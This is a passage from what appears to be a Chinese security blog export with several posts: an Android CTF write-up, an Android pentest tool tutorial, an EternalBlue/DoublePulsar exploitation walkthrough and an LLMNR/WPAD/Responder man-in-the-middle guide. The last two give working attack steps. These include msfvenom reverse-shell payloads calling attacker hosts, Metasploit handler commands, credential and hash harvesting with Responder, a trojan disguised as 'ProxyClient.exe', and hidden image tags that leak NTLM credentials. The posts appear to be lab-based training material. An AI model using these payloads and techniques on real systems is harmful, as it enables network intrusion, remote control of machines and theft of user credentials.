    <url>%2F2017%2F06%2F25%2Fandroid-codeengn%2F</url>
    <content type="text"><![CDATA[概述为了让初学者能够更好的学习基于android的渗透测试，CodeEngn开发了很多的android app供大伙学习。 SmartApp AnalysisSmartApp 01题目地址SmartApp 01 解题步骤发现程序不能直接安装到手机上。 解压APK文件后发现有三个文件的文件名是错误的且缺少META-INF文件，所以不能正常安装到手机，如下图所示： 修改错误的文件名后，进行zip压缩，并修改后缀为apk，然后进行签名： 12$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore releasekey.keystore C:\Users\dell\Desktop\app-test\SmartApp-L01.apk keyalias 签名成功后安装到移动设备上，打开启动app就可以看到Key：H3ll0 C0de3ngn。 SmartApp 02题目地址SmartApp 02 解题步骤发现程序不能直接安装到手机上。 解压apk文件后发现缺少META-INF文件，签名成功后安装到移动设备上，打开启动app就可以看到如下界面： 于是反编译了下源代码，发现key的值被加密了，而且作了限制，只有条件成立，才能解密： 于是修改smali代码： 重新编译下程序，然后再进行一次签名，然后安装到手机上，key就出来了： The Key is November Rain。 SmartApp 03题目地址SmartApp 03 解题步骤发现程序不能直接安装到手机上。 解压apk文件后发现缺少META-INF文件，签名成功后安装到移动设备上，打开启动app就可以看到如下界面： 用androidlyze.py分析了下代码： 123$ a, d, dx=AnalyzeAPK('Desktop/SmartAppL03.apk', decompiler="dad")$ d.CLASS_Lcom_Namdaehyeon_findekey3_MainActivity.source()$ d.CLASS_Lcom_Namdaehyeon_findekey3_MainActivity_1.source() 看了代码之后，发现模拟器界面没有显示全，少了几个按钮，而且看到了判断的条件： 首先修改判定条件，如下图： 然后进行签名。既然模拟器运行不全，应该是android的版本有问题，换到手机试下： SmartApp 04题目地址SmartApp 04 解题步骤直接反编译一下，发现这里有个条件判断，输入key后才能显示答案正确： 先看下dex的字符串： 找到了一个比较可疑的地方，这里有一个helloWorldD函数，而直接还原成java代码，并不能找到： 通过010编辑器查看确实有一个helloWorldD函数，应该是被隐藏掉了： 找到原先的helloWorldC函数，它后面应该是helloWorldD函数，记下地址：0x0cd0 找到如下图所示的地方，根据前几个函数相应的规则，修改： 用androidlyze.py分析了下代码： 12$ d,dx = AnalyzeDex("Desktop/classes.dex",decompiler="dad")$ d.CLASS_Lcom_namdaehyeon_zfinekey4_zFindKey.source() 可以看到就是每个位置和 240(0xf0) 异或了下： 解出来就是： The Key is BoanprojectZZang #总结]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>android</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android 渗透测试基础入门]]></title>
    <url>%2F2017%2F06%2F22%2Fandroid-base%2F</url>
    <content type="text"><![CDATA[概述自从毕业了之后就少了很多杂七杂八的事，可以好好的学习下Android以及Android渗透测试。 基本结构AndroidAndroid 架构Android 是基于 Linux 平台的操作系统。Android的系统架构和其操作系统一样，采用了分层的架构。从架构图看，Android分为四个层，从高层到低层分别是应用程序层、应用程序框架层、系统运行库层和Linux内核层。 Android使用Dalvik虚拟机的概念，可以高效的运行多个虚拟机。Android操作系统使用这些虚拟机将各个应用程序运行为自己的进程。 安装的应用程序会因各种目的保存到如下目录： 123456/system/app/应用名.apk // 保存系统应用程序/data/app/应用名.apk // 保存已注册的用户应用程序/data/app/应用名-1.apk // 保存用户下载的应用程序/mnt/secure/asec/应用名-1.asec // 保存移动到SD卡的应用程序/data/data/应用名 // 保存应用程序的重要信息/mnt/sdcard // 保存应用程序的一般信息 其中/data/data/应用名保存的信息最为重要： 123456/data/data/应用名├─files // 保存内部使用的文件（so、data、ini文件等）├─lib // 保存应用程序请求的库文件（存在so文件）├─databases // 保存设置文件、内容文件等的查询信息的SQLite数据库文件（存在db文件）├─cache // 有读写权限，包括浏览器缓存和用户临时状态信息└─shared_prefs // 保存为XML文件，是应用程序共享的设置文件 其中 shared_prefs 目录内的preferences.xml文件包含应用程序的设置文件。因为包括升级、版本信息等内容，所以恶意访问时，此处会包含API密钥的盗用、认证密钥值等信息。 Android 重要组件以及生命周期Android 由Activity，Service（服务）,Content Provider（内容提供者），BroadCastReceiver（广播接收器）四大基本组件组成。 ActivityAndroid 应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity的生命周期如下图所示： 途中涉及到的各类方法： ServiceService 不会显示给用户，其运行过程与Activity相似。听音乐或者录音都在后台运行，与其他软件的运行是同时的，这些都属于Service的功能。 Activity与Service都以名为UI线程的相同应用线程执行。 Content ProviderContent Provider 是应用程序之间共享数据的界面。Android的每个应用程序都默认在Sandbox中运行，所以与系统中的其他应用程序相互分隔，不能直接访问数据。Content Provider遵守CURD（Create、Update、Read、Delete）原则。应用程序通过Inter共享小数据。Content Provider 适合共享音乐文件、图片文件等大容量文件。 BroadCastReceiver你的应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager 来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。 四大组件的注册四大基本组件都需要注册才能使用，每个Activity、service、Content Provider内容提供者都需要在AndroidManifest文件中进行配置，AndroidManifest文件中未进行声明的activity、服务以及内容提供者将不为系统所见，从而也就不可用，而BroadcastReceive广播接收者的注册分静态注册（在AndroidManifest文件中进行配置）和通过代码动态创建并以调用Context.registerReceiver()的方式注册至系统。需要注意的是在AndroidManifest文件中进行配置的广播接收者会随系统的启动而一直处于活跃状态,只要接收到感兴趣的广播就会触发（即使程序未运行）。 AndroidManifest文件中进行注册格式如下：1234&lt;activity&gt; 元素的name 属性指定了实现了这个activity 的Activity 的子类。icon 和label 属性指向了包含展示给用户的此activity 的图标和标签的资源文件。&lt;service&gt; 元素用于声明服务&lt;receiver&gt; 元素用于声明广播接收器&lt;provider&gt; 元素用于声明内容提供者 APKAPK 文件其实是一个 Zip 的压缩包，解压了此文件可以看到如下目录： 12345678910APK├─META-INF // 主要存放证书，没有证书无法安装程序 │ ├─CERT.RSA // 公钥证书│ ├─CERT.SF // 包含APP的所用资源，负责对APP进行签名│ └─MANIFEST.MF // 声明了资源，与CERT.SF相似├─res // 存放资源文件的目录├─lib // 如果存在的话，存放的是 ndk 编出来的 so 库├─resources.arsc // 编译后的二进制资源文件├─classes.dex // 最终生成的 dalvik 字节码└─AndroidManifest.xml // 程序全局配置文件 classes.dexDex是Android系统中可以在Dalvik虚拟机上直接运行的文件格式。java源代码经过ADT的复杂编译后转换成Dex文件，这是一个逐步优化的过程。Dex文件的指令码就是Dalvik虚拟机专有的一套指令集，专门为嵌入式系统优化过，相比标准java的.class文件，它体积小，运行效率高。 classes.dex 文件头的格式如下： androidManifest.xmlandroidManifest.xml 是每个Android程序中必须的文件，它位于整个项目的根目录。我们每天都在使用这个文件，往里面配置程序运行所必要的组件，权限，以及一些相关信息。 AndroidManifest.xml是Android应用的入口文件，它描述了package中暴露的组件（activities, services, 等等），他们各自的实现类，各种能被处理的数据和启动位置。 除了能声明程序中的Activities, ContentProviders, Services, 和Intent Receivers,还能指定permissions和instrumentation（安全控制和测试）。 常用工具ADBadb的全称为Android Debug Bridge，就是起到调试桥的作用。通过adb我们可以在Eclipse中方面通过DDMS来调试Android程序，说白了就是debug工具。adb的工作方式比较特殊，采用监听Socket TCP 5554等端口的方式让IDE和Qemu通讯，默认情况下adb会daemon相关的网络端口，所以当我们运行Eclipse时adb进程就会自动运行。 借助adb工具，可以管理设备或手机模拟器的状态。还可以进行很多手机操作，如安装软件、系统升级、运行shell命令等等。其实简而言说，adb就是连接Android手机与PC端的桥梁，可以让用户在电脑上对手机进行全面的操作 命令介绍123456789101112131415161718192021222324252627282930313233343536# 查看设备$ adb devices# 连接设备（夜神模拟器端口 62001）$ adb connect ip:port # 安装软件$ adb install [apk文件路径]# 卸载软件$ adb uninstall [软件名]$ adb uninstall -k [软件名] // 如果加 -k 参数,为卸载软件但是保留配置和缓存文件.# 进入设备或模拟器的shell$ adb shell# 运行单条命令$ adb shell [command]# 端口转发$ adb forward [PC] [设备]$ adb forward tcp:6100 tcp:7100 // PC上所有6100端口通信数据将被重定向到手机端7100端口server上$ adb forward tcp:6100 local:logd // PC上所有6100端口通信数据将被重定向到手机端UNIX类型socket上$ adb forward tcp:62002 jdwp:17304 //在本地62002端口被重定向到手机17304进程上# 从电脑上发送文件到设备$ adb push [本地路径] [远程路径]# 从设备上下载文件到电脑$ adb pull [远程路径] [本地路径]# 查看bug报告$ adb bugreport# 查看log$ adb logcat drozerDrozer原名mercury,是一款不错的Android APP安全评估工具。现在有社区版/专业版两个版本。 安装安装其实比较简单，这里不进行描述，只是记录下安装过程中遇到的问题以及解决方案。 一、修复连接时java路径找不到问题 解决方案： 1、创建如下文件并命名为：1.txt （如果为winXP，则可以直接命名为.drozer_config）2、写入内容如下几行内容：此处为java.exe文件的安装位置，具体情况具体处理。 123[executables]java =C:\rogram Files\Java\jdk1.7.0_40\bin\java.exejavac =C:\Program Files\Java\jdk1.7.0_04\bin\javac.exe 3、把此文件放入个人目录下文件夹： 12英文：C:\Users\&lt;youruser name&gt;\中文：C:\用户\&lt;你的用户名名称&gt;\ 4、通过cmd命令重命名此文件为：.drozer_config 1rename C:\Users\d00218136\1.txt .drozer_config 运行12$ adb connect 127.0.0.1:62001 // 连接设备$ adb forward tcp:31415 tcp:31415 // 开启端口转发 开启移动设备中的agent.apk 1$ drozer console connect 用法123# 列出设备中安装的包$ run app.package.list$ run app.package.list -f 【app名称】 // 搜索包 1234# 获取安装的包的信息$ run app.package.info$ run app.package.info -a com.zjhcsoft.android.eip // 列举指定包的信息$ run app.package.info -p android.permission.INTERNET // 根据权限来列举包 123# 列举设备上所有的activity$ run app.activity.info$ run app.activity.info -f 【包名】 搜索包的activity 1234567891011121314151617181920# 列举设备上所有的provider$ run app.provider.info# 列举设备上所有的service$ run app.service.info# 列举设备上所有的broadcast$ run app.broadcast.info# 查看某包的受攻击面$ run app.package.attacksurface com.zjhcsoft.android.eip# 运行activity$ run app.activity.info -a 【包】 $ run app.activity.start --action 【activity 设置的intent filter的action属性】 --category 【activity 设置的intent filter的category 属性】--component 【package 名字】 【component 属性】$ run app.activity.start --action android.intent.action.MAIN --category android.intent.category.LAUNCHER --component com.android.browser com.android.browser.BrowserActivity# 根据指定的intent action和intent category来查看activity$ run app.activity.forintent --action 【intent action】 --category 【intent category】$ run app.activity.forintent --action android.intent.action.VIEW --category android.intent.category.DEFAULT 其他用法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455Dex是Android系统中可以在Dalvik虚拟机上直接运行的文件格式。java源代码经过ADT的复杂编译后转换成Dex文件，这是一个逐步优化的过程。Dex文件的指$ run 令码就是Dalvik虚拟机专有的一套指令集，专门为嵌入式系统优化过，相比标准jav// a的.class文件，它体积小，运行效率高。$ run app.activity.forintent // Find activities that can handle the given intent $ run app.activity.info // Gets information about exported activities. $ run app.activity.start // Start an Activity $ run app.broadcast.info // Get information about broadcast receivers $ run app.broadcast.send // Send broadcast using an intent $ run app.broadcast.sniff // Register a broadcast receiver that can sniff particular intents $ run app.package.attacksurface // Get attack surface of package $ run app.package.backup // Lists packages that use the backup API (returns true on FLAG_ALLOW_BACKUP) $ run app.package.debuggable // Find debuggable packages $ run app.package.info // Get information about installed packages $ run app.package.launchintent // Get launch intent of package $ run app.package.list // List Packages $ run app.package.manifest // Get AndroidManifest.xml of package $ run app.package.native // Find Native libraries embedded in the application. $ run app.package.shareduid // Look for packages with shared UIDs $ run app.provider.columns // List columns in content provider $ run app.provider.delete // Delete from a content provider $ run app.provider.download // Download a file from a content provider that supports files $ run app.provider.finduri // Find referenced content URIs in a package $ run app.provider.info // Get information about exported content providers $ run app.provider.insert // Insert into a Content Provider $ run app.provider.query // Query a content provider $ run app.provider.read // Read from a content provider that supports files $ run app.provider.update // Update a record in a content provider $ run app.service.info // Get information about exported services $ run app.service.send // Send a Message to a service, and display the reply $ run app.service.start // Start Service $ run app.service.stop // Stop Service $ run auxiliary.webcontentresolver // Start a web service interface to content providers. $ run exploit.jdwp.check // Open @jdwp-control and see which apps connect $ run exploit.pilfer.general.apnprovider // Reads APN content provider $ run exploit.pilfer.general.settingsprovider // Reads Settings content provider $ run information.datetime // Print Date/Time $ run information.deviceinfo // Get verbose device information $ run information.permissions // Get a list of all permissions used by packages on the device $ run scanner.activity.browsable // Get all BROWSABLE activities that can be invoked from the web browser $ run scanner.misc.native // Find native components included in packages $ run scanner.misc.readablefiles // Find world-readable files in the given folder $ run scanner.misc.secretcodes // Search for secret codes that can be used from the dialer $ run scanner.misc.sflagbinaries // Find suid/sgid binaries in the given folder (default is /system). $ run scanner.misc.writablefiles // Find world-writable files in the given folder $ run scanner.provider.finduris // Search for content providers that can be queried from our context. $ run scanner.provider.injection // Test content providers for SQL injection vulnerabilities. $ run scanner.provider.sqltables // Find tables accessible through SQL injection vulnerabilities. $ run scanner.provider.traversal // Test content providers for basic directory traversal vulnerabilities. $ run shell.exec // Execute a single Linux command. $ run shell.send // Send an ASH shell to a remote listener. $ run shell.start // Enter into an interactive Linux shell. $ run tools.file.download // Download a File $ run tools.file.md5sum // Get md5 Checksum of file $ run tools.file.size // Get size of file $ run tools.file.upload // Upload a File $ run tools.setup.busybox // Install Busybox. $ run tools.setup.minimalsu // Prepare 'minimal-su' binary installation on the device. androguardandroguard (Android guard) 是 Android 应用程序的逆向工程，提供恶意软件分析等等功能，androguard 主要由 Python 编写。 androguard 主要有以下功能： 1234567androrisk.py // 该模块用于分析apk危险级别androapkinfo.py // 该模块分析apk列出其中的文件类型、权限、4大组件、是否NDK反射等信息androaxml.py // 该模块用于展示apk androidmanifest.xmlandrogexf.py // 该模块生成函数调用图apkviewer.py // 该模块生成指令级别的调用图androlyze.py // 该模块为交互分析环境androdiff.py // 分析2个apk的不同之处,检测app是否遭到修改 androapkinfo.py该模块分析apk列出其中的文件类型、权限、4大组件、是否NDK反射等信息 1$ python androapkinfo.py -i app-release.apk androlyze.py该模块为交互分析环境 1$ python androlyze.py -i app-release.apk -x 123$ python androlyze.py -s$ a,d,dx = AnalyzeAPK("Desktop/app-release.apk")$ print a,d,dx 12$ d,dx = AnalyzeDex("Desktop/classes.dex")$ print d,dx 等等，可以使用tab键 androdd.py查看apk文件结构 按照指定格式显示androidapk的所有类和子方法的信息流 1$ python androdd.py -i app-release.apk -o out -f png androgexf.pyandrogexf.py 将方法信息之间的连接状态转换成gexf格式 1$ androgexf.py -i app-release.apk -o apk.gexf androdiff.pyandrodiff.py 分析2个apk的不同之处,检测app是否遭到修改 1$ python androdiff.py -i app-release1.apk app-release2.apk 工具集一、santoku 操作系统 santoku 实质是一款定制的 Ubuntu 12.04 系统镜像，类似于KALI，与其它Ubuntu系统相比，它具有如下特点： 1.集成了大量主流的Android程序分析工具，为分析人员节省分析环境配置所需的时间。2.集成移动设备取证工具。支持Android、IPhone 等移动设备的取证工作。3.集成渗透测试工具。4.集成网络数据分析工具。在分析 Android病毒、木马等程序时，这些工具特别有用。5.采用 LXDE 作为系统的桌面环境，界面与 Windows XP非常相似，符合中国人使用习惯。6.正处于beta 阶段，但整个项目显得很有活力，相信将来的更新和维护也会不错。 二、APKIDE APKIDE这是一个大佬们集成的一个APK的测试工具集，包含了常用的大部分工具，例如adb、apktool等。 基础操作签名前面介绍过，META-INF这个文件主要与签名、证书有关。 对APP进行签名一、删除apk中的META-INF文件夹，然后重新zip压缩成apk二、创建密钥存储器（已经有的可以跳过） 1$ keytool -genkey -v -keystore 【keystore名称】 -alias 【密钥别名】 -keyalg RSA -keysize 2048 -validity 【有效天数】 三、使用密钥存储器对app进行签名 1$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】 签名成功后会重新出现META-INF文件夹 查看APP的签名解压APK文件，使用JDK的keytool来查看META-INF/CERT.RSA文件内容 1$ keytool -printcert -file 【证书】 验证APP的签名1$ jarsigner -verify -verbose 【apk存放路径】 查看AndroidManifest.xml文件1$ java -jar apktool.jar d -f s 【APK地址】 静态调试一、将apk文件转化为jar文件 1$ dex-jar.bat 【apk】 二、jd-gui.exe 可反编译jar文件 动态调试一、将apk转换成smali代码 1$ java -jar apktool.jar d 【APK地址】 -o out 二、修改AndroidManifest.xml中的Android:debuggable=”true” 三、在入口处添加waitForDebugger代码进行调试等待 这里说的入口处，就是程序启动的地方，就是我们一般的入口Activity，查找这个Activity的话，方法太多了，比如我们这里直接从上面得到的AndroidManifest.xml中找到，因为入口Activity的action和category是固定的。 找到入口Activity之后，我们直接在他的onCreate方法的第一行加上waitForDebugger代码即可，找到对应的MainActivity的smali源码：然后添加一行代码： 1invoke-static &#123;&#125;, Landroid/os/Debug;-&gt;waitForDebugger()V // 相当于java的 android.os.Debug.waitForDebugger(); 四、将smali 转换成apk 1$ java -jar apktool.jar b 【路径】 【目标路径】 五、重新签名 1$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】 六、安装apk 1$ adb install 【apk】 七、android studio 导入此项目，需要配置gradle，可参考文章 路径一般为 home\.gradle\wrapper\dists\gradle-x.x-all\xxxxxxxxxxxxx\gradle-x.x 八、配置android studio调试配置，Run-&gt;Edit configurations，点击+号，新建remote类型调试器，设置Name， 修改端口号，可以选择被占用的任意端口，本次设置为62002 九、运行指定的Activity 1$ adb shell am start -D -n com.zjhcsoft.android.eip/.MainActivity 十、查找相应的apk进程 1$ adb shell ps | findstr eip 十一、设置端口转发 1$ adb forward tcp:62002 jdwp:17304 这条命令的含义可以认为是在本地62002端口与手机17304进程之间建立一条通道，当开始调试时，AS连接本地的8800端口，通过这条通道控制程序的运行 十二、设置断点 十三、调试 run-&gt;debug选择刚才新增的调试器，此时程序会断在设置的断点的行，调试器解密如下 渗透测试中注意的点废话不说，直接上图好了。 总结毕竟还只是刚入门，学的时间也不是很久，就先总结到这，之后在进行渗透测试方面的练习以及案例的补充。]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 Equation Group 0day Tools]]></title>
    <url>%2F2017%2F04%2F22%2Fequation-group-0day-2017%2F</url>
    <content type="text"><![CDATA[概述Shadow Brokers黑客组织上周泄露了NSA方程式组织的一些工具，其中某些工具客直接拿下Windows服务器 。 工具包安装 下载安装 python-2.6.6.msi ,pywin32-221.win32-py2.6.exe 。 下载解压 shadowbroker 。 在 shadowbroker 的 windows 目录下新建 listeningposts 目录。 工具包简介 swift 银行攻击的证据 oddjob 植入后门等相关文档 windows 包含了各种漏洞利用工具 最主要还是Windows目录，其包含了各种漏洞利用工具，在exploits中包含了丰富的漏洞利用工具，可影响windows多个平台。 Exploits包含了很多漏洞利用工具，经过大佬们的初步梳理，重点关注对win server有影响的几个工具。 Tools Service Port Describe Explodingcan IIS IIS漏洞利用工具，只对Windows 2003有影响 Eternalromance 139和445 MS17-010 SMB 和 NBT漏洞利用工具 Emphasismine 143 通过ICMP漏洞工具 Englishmansdentist SMTP(25) 通过SMTP漏洞工具 Erraticgopher RPC(445) 通过RPC漏洞工具 Eskimoroll 88 MS14-068 漏洞利用工具，通过kerberos入侵 Eclipsedwing SMB(445) MS08-67 漏洞利用工具 Educatedscholar SMB(445) MS09-050 漏洞利用工具 Emeraldthread 139和445 MS10-061 MB和 Netbios 漏洞利用工具 Zippybeer SMB(445) SMTP漏洞利用工具 Eternalsynergy SMB(445) MS17-010 SMB漏洞利用工具 Esteemaudit RDP(3389) RDP漏洞利用工具 FUZZBUNCH是一个类似 MSF的漏洞利用平台工具，python编写。 Specials Tools Service Port Describe ETERNALBLUE SMB(445) SMB漏洞利用工具，xp、2003、2008、7均有部分覆盖(MS17-010) ETERNALCHAMPION SMB(445) SMB漏洞利用工具，xp、2003、2008、7均有部分覆盖(CVE-2017-0146/0147) ETERNALBLUE实验环境攻击机1 win7 64 旗舰版 python-2.6.6.msi pywin32-221.win32-py2.6.exe shadowbroker IP : 192.168.111.155 攻击机2 kali 2016.2 IP : 192.168.111.144 靶机 win2008 IP : 192.168.111.158 systeminfo 信息如下： 复现过程初始化配置，创建一个攻击项目。 使用 ETERNALBLUE 模块。 使用 DoublePulsar 模块。 DoublePulsar是一个后门程序，用于在已感染的系统上注入和运行恶意代码。这是一种NSA用作监听使用的后门程序，如今在GitHub上得到免费发布后，任何人均可使用。其软件是在Windows XP到Server 2008 R2系统版本中的计算机上，通过使用EternalBlue Exploit的SMB文件共享服务端口启动旧版本下的远程执行代码RCE，随后进行程序的安装。也就是说，会受到攻击影响的计算机系统是存在漏洞的Windows版本，因为这给攻击者提供了其SMB端口。 这里要选择SMB和对应的目标操作系统位数下面的话是攻击的4个操作 选择RunDLL。 这里用攻击机2 kali的msfvenom 生成一下dll 这里使用的是reverse_tcp的paylaod 可以根据网络情况采用其他payload 1$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.111.144 LPORT=5555 -f dll &gt; s.dll 把生成的s.dll传到攻击机1上去， 然后kali开启msfconsole 监听，下面的payload要和上面msfvenom的payload对应起来 123456$ msfconsole msf &gt; use exploit/multi/handler msf &gt; set LHOST 192.168.111.144 msf &gt; set LPORT 5555 msf &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp msf &gt; exploit 然后操作fb.py ，加载s.dll。 kali 收到反弹的shell 。 总结当然，还有其他的攻击模块，下次继续更新。 为了平时的渗透测试的方便，我临时写了个检测的脚本（测试版）,供大家测试使用。 参考ShadowBrokers方程式工具包浅析，揭秘方程式组织工具包的前世今生方程式 0day ETERNALBLUE 复现过程]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>code execution</tag>
        <tag>equation group</tag>
        <tag>eternalBlue</tag>
        <tag>doublePulsar</tag>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中间人攻击——LLMNR、WPAD以及Responder]]></title>
    <url>%2F2017%2F04%2F09%2Fspoof-llmnr-wpad%2F</url>
    <content type="text"><![CDATA[概述继续学习一波中间人攻击的LLMNR、WPAD以及Responder，备忘。 概述Windows系列机子在局域网中查询DNS一般通过如下的几个步骤： 查看本地hosts文件。 1type C:\Windows\system32\drivers\etc\hosts 查询本地DNS缓存。 1ipconfig/displaydns 向dns服务器发送dns请求。 如果本地网络中的dns也解析失败,它就会被交给LLMNR[链路本地多播名称解析]和netbios-ns去处理解析。 LLMNR 以及 NetBIOS——NS从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议 —— LLMNR，主要用于局域网中的名称解析。在DNS 服务器不可用时，DNS 客户端计算机可以使用本地链路多播名称解析 (LLMNR—Link-Local Multicast Name Resolution)（也称为多播 DNS 或 mDNS）来解析本地网段上的名称。例如，如果路由器出现故障，从网络上的所有 DNS 服务器切断了子网，则支持 LLMNR 的子网上的客户端可以继续在对等基础上解析名称，直到网络连接还原为止。 LLMNR为使用IPv4、IPv6或者同时使用这两种地址的设备提供了点对点名称解析服务，LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是一个仅次于 DNS 的名称解析方式，更重要的是在 Linux 操作系统中也实现了 LLMNR。 LLMNR通过在DNS名称解析服务不可用时提供解析服务，弥补了DNS的不足。 LLMNR 和DNS一样，LLMNR 名称解析过程所使用的传输协议为 UDP 协议。其IPv4 的广播地址为 - 224.0.0.252, IPv6 的广播地址为 - FF02:0:0:0:0:0:1:3 或 FF02::1:3。在主机中所监听的端口为 UDP/5355。 使用 Wireshark 抓取一个完整的 LLMNR 质询/应答过程的数据包，如下图所示： 从上图可以看到，主机 A 分别使用自己的 IPv4 地址和 IPv6 地址向 IPv4 和 IPv6 的广播地址进行了广播。查询的地址类型为请求主机 B 的 IPv4 地址，这一点可以从 A 或 AAAA 进行区别。一个 A 表示请求的地址类型为 IPv4 地址，四个A（AAAA）表示请求的地址类型为 IPv6 地址。 NetbiosNetbios 即名称服务,专门用于同一内网下windows机器之间通过机器名相互访问,工作在会话层。NetBIOS是本地网络的系统API，它有三种NetBIOS服务： 域名服务，使用137端口用于域名注册和域名解析 数据分发服务，使用138端口连接通信 会话服务，使用139端口面向连接通信 在dns查询失败后，LLMNR会调用NetBIOS，生成一个NetBIOS-NS数据包然后使用广播的方式发送出去。 这个看似没什么坏处的协议，我们可以利用其进行中间人攻击从而获取敏感数据，如用户名，hash等。 劫持会话获取 HASH 劫持 SMB 会话获取 HASH 利用 LLMNR Poison 攻击劫持 SMB 会话与 SMBRelay 攻击相似，本质上都是对 SMB 的会话进行劫持，但是 SMBRelay 攻击是被动式的攻击，同时，攻击者所劫持的 SMB 会话只有在该会话本身是一次成功的会话的情况下才能拿到目标服务器的权限。利用 LLMNR Poison 攻击劫持 SMB 会话，只要有主机使用计算机名称访问其他主机的共享时就可以得到发起共享请求的主机的 HASH。但是这个 HASH 只能用于爆破（因为已知了挑战），无法直接登录主机。可以将 LLMNR Poison 攻击 与 SMBRelay 攻击结合起来，提升攻击力。 使用 HTTP 401 认证获取 HASH 使用 HTTP 401 认证同样也可以获取到客户端机器的 HASH。 攻击原理假设现在有三台机器： A 被欺骗主机： 192.168.111.170B 攻击机：192.168.111.183C 被欺骗主机要访问的服务器：192.168.111.1 当A向C发起共享资源请求时,由于本地dns解析失败,正常情况下该请求会被交给LLMNR然后执行netbios查询,但不巧的是攻击者此时正在监听网络中的所有netbios查询请求,自然也就会捕捉到这条查询,当攻击者捕捉到该查询之后,它会告请求者也就是A,我[B]就是你要请求的那台服务器,接着A会把自己的账号密码提供给B认证,也就是说,此时B已经截获到了A的账号密码。 具体操作 在C服务器上,也就是我们的服务器上先创建一个共享目录： 攻击机启动responder 此时,我们再利用responder 来获取目标的smb hash,虽然不是明文,但我们可以配合类似hashcat的hash破解工具尝试破解该hash,当然,如果你有自己的GPU矩阵就再好不过了,或许很快就可以拿到对应的明文 1root@kali:~# responder -I eth0 然后再回到A上通过smb进行访问： Kali 攻击机上可以看到如下hash值 WPADWPAD（web代理自动发现协议-Web Proxy Auto-Discovery Protocol），是客户端通过DHCP或DNS协议探测代理服务器配置脚本url的一种方式。当IE定位脚本并将脚本下载到本地之后，就可以通过该脚本来为不同的url选择相应的代理服务器。目前主流浏览器一般都支持WPAD。 只要应用于如下场景，公司内网为了安全，不允许员工直接访问外网的服务，但是允许公司员工通过web代理访问外网资源，但是对于员工来说设置代理又是个麻烦事，所以通常公司主要使用用WPAD来查找网络中的wpad.dat文件的,有了该文件以后,客户端以后就会根据文件中的内容自动配置代理。 查询wpad.dat文件主要通过如下几个方式： 通过dns查询。 通过dhcp服务进行检索。 利用LLMNR查询。 攻击原理可以利用dns或者dhcp毒化,来操控流量指向,但这种方式很容易被拦截,而LLMNR则不一样,它是通过广播告诉同一内网下的所有windows,它就是wpad服务器,这样当你的浏览器设置为自动检测代理设置的情况下,它就会下载攻击者事先准备好的wpad.dat文件,这样一来,客户端的流量就会经过攻击者的机器。 假设现在有三台机器： A 被欺骗主机： 192.168.111.170B 攻击机：192.168.111.183C 被欺骗主机要访问的服务器：192.168.111.184 具体操作 在C服务器上,也就是我们的服务器上先创建一个共享目录： 攻击机启动responder 1root@kali:~# responder -I eth0 -wFb 在被欺骗主机上开启自动检测脚本 被欺骗者访问主机目标服务器，并登陆 Kali 攻击机上可以看到如下明文密码 其他Responder 结合钓鱼页面/跨站进行伪造钓鱼页面或者借助跨站插入如下相关请求， 12&lt;img/src=\\WIN764TEST1\1.jpg width=0 height=0&gt; &lt;img/src=http:\\WIN764TEST1\1.jpg width=0 height=0&gt; 如果受害者进行了账号密码输入，那么就能得到相应的信息，比如hash值或者明文密码等。 responder 钓鱼木马 首先,准备好自己的马,这里我就暂时直接用msf来生成了，现实中免杀是必须的,生成好以后把它放到我们的responder的files目录中， 12root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.111.183 LPORT=1234 -f exe -o /root/Desktop/shell.exeroot@kali:~# mv /root/Desktop/shell.exe /usr/share/responder/files/ msf监听端口 12345use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.111.183 set LPORT 1234exploit -j 编辑responder.conf 1root@kali:~# vi /etc/responder/Responder.conf 12345Serve-Always = OnServe-Exe = On HtmlFilename = files/AccessDenied.htmlExeFilename = files/shell.exe 指定我们刚刚生成的shell名称ExeDownloadName = ProxyClient.exe 提示下载时所显示的名称,最好弄个成功率比较高的有诱惑性的名字 启动responder： 1root@kali:~# responder -I eth0 -wrf 等待被欺骗机访问任意域名，下载运行程序 kali成功控制。 参考文章利用LLMNR协议进行常规win内网渗透的理解与实践利用 LLMNR 名称解析缺陷劫持内网指定主机会话]]></content>
      <categories>
        <category>spoof</category>
      </categories>
      <tags>
        <tag>dnsspoof</tag>
        <tag>llmnr</tag>
        <tag>responder</tag>
        <tag>wpad</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dizcus Pentest]]></title>
    <url>%2F2017%2F04%2F04%2Fdizcus-pentest%2F</url>
